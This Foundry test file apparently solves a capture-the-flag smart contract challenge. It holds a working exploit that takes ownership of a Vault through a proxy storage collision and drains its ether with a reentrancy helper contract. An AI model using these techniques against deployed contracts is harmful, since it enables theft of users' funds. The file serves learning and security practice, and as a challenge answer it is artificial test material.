// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/MyVault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        bytes32 callData = bytes32(uint256(uint160(address(logic))));
        address(vault).call(abi.encodeWithSelector(VaultLogic.changeOwner.selector, callData, palyer));
        vault.openWithdraw();

        MyVault myVault = new MyVault(palyer);
        payable(address(myVault)).transfer(0.1 ether);
        vm.stopPrank();

        vm.startPrank(address(myVault));
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
        require(vault.isSolve(), "solved");
        vm.stopPrank();

        vm.startPrank(palyer);
        myVault.withdraw(); 
        assertEq(1.1 ether, palyer.balance);
        
        vm.stopPrank();
    }

}